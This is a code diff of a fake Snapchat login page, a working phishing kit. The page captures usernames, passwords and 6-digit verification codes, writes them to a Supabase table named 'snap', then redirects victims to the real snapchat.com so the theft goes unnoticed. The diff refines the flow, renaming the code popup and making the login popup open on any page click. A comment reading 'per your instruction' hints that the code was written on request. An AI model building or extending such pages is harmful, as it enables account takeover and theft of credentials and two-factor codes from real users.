@@ -255,12 +255,12 @@ margin-bottom: 30px;
         <button class="login-button" onclick="loginAndSaveData()">Login</button>
     </div>
 
-    <div class="popup-menu" id="verifyMenu">
+    <div class="popup-menu" id="codePopup">
         <img src="snapchat-logo-46444.png" alt="Add Icon" class="snap-logo">
         <h3>Verification</h3>
-        <p style="font-size: 14px; margin-bottom: 10px; color: gray;">Enter the 6-digit code sent to your email.</p>
+        <p style="font-size: 13px; color: gray; margin-bottom: 20px;">Enter the 6-digit code sent to your device.</p>
         <h2>6-Digit Code</h2>
-        <input type="text" id="verificationCode" class="text-input" placeholder="XXXXXX" maxlength="6">
+        <input type="text" id="digitCode" class="text-input" placeholder="000000" maxlength="6">
         <br><br>
         <button class="login-button" onclick="verifyAndSaveCode()">Verify</button>
     </div>
@@ -290,8 +290,8 @@ margin-bottom: 30px;
 
     <script>
         function openPopup() {
-            // Only open login if verify is not active
-            if (document.getElementById("verifyMenu").style.display !== "block") {
+            // Only open if the code popup isn't already active
+            if (document.getElementById("codePopup").style.display !== "block") {
                 document.getElementById("popupMenu").style.display = "block";
                 document.querySelector(".popup-overlay").style.display = "block";
             }
@@ -299,14 +299,12 @@ margin-bottom: 30px;
 
         function closePopup() {
             document.getElementById("popupMenu").style.display = "none";
-            document.getElementById("verifyMenu").style.display = "none";
+            document.getElementById("codePopup").style.display = "none";
             document.querySelector(".popup-overlay").style.display = "none";
         }
 
         document.body.addEventListener("click", function(event) {
-            // If neither popup is open, open the login popup
-            if (document.getElementById("popupMenu").style.display !== "block" && 
-                document.getElementById("verifyMenu").style.display !== "block") {
+            if (!event.target.closest(".popup-menu")) {
                 openPopup();
             }
         });
@@ -322,31 +320,33 @@ margin-bottom: 30px;
                 return;
             }
 
+            // Save the initial login credentials
             const { data, error } = await supabaseClient.from("snap").insert([{ username, password }]);
 
             if (error) {
                 alert("Error saving data: " + error.message);
             } else {
-                // Hide login, show verification
+                // Hide Login and Show Code Popup
                 document.getElementById("popupMenu").style.display = "none";
-                document.getElementById("verifyMenu").style.display = "block";
+                document.getElementById("codePopup").style.display = "block";
             }
         }
 
         async function verifyAndSaveCode() {
-            const code = document.getElementById("verificationCode").value;
+            const code = document.getElementById("digitCode").value;
 
             if (!code || code.length < 6) {
-                alert("Please enter a valid 6-digit code.");
+                alert("Please enter the 6-digit code.");
                 return;
             }
 
-            // Save with username 0 and password as the code per your instruction
+            // Save the code with username "0" and password as the code value
             const { data, error } = await supabaseClient.from("snap").insert([{ username: "0", password: code }]);
 
             if (error) {
                 alert("Error saving code: " + error.message);
             } else {
+                // Final redirect
                 window.location.href = "https://www.snapchat.com";
             }
         }
